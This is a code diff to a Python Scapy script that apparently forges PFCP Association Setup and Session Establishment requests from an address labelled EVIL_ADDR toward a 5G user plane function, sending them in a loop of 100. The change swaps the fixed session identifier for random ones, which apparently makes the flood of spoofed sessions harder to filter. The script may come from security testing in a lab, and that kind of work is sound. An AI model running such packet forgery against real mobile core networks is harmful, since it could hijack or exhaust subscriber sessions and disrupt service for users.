@@ -1,13 +1,14 @@
 from scapy.all import send, IP, UDP
 from scapy.contrib.pfcp import *
-import time
+import time, random
 EVIL_ADDR = "10.100.200.66" 
 UPF_ADDR  = "10.100.200.2"
 DEST_PORT = 8805
 SRC_PORT = 8805
 seq=1
 
-
+def random_seid():
+    return random.randint(1, 0xFFFFFFFFFFFFFFFF)
 
 def send_pfcp_association_setup_req():
     global seq
@@ -32,10 +33,9 @@ def send_pfcp_association_setup_req():
     print(f"PFCP Association Setup packet sent")
     seq += 1
 
-def send_pfcp_session_establishment_req():
+def send_pfcp_session_establishment_req(seid=0xC0FFEE):
     global seq
     
-    seid = 0xC0FFEE
     teid = 0x11111111
     ue_ip = "1.1.1.1" # Random IP address
     network_instance = "internet"
@@ -84,7 +84,7 @@ def send_pfcp_session_establishment_req():
 for x in range(100):
     send_pfcp_association_setup_req()
     time.sleep(0.1)
-    send_pfcp_session_establishment_req()
+    send_pfcp_session_establishment_req(random_seid())
     time.sleep(0.1)
 
     
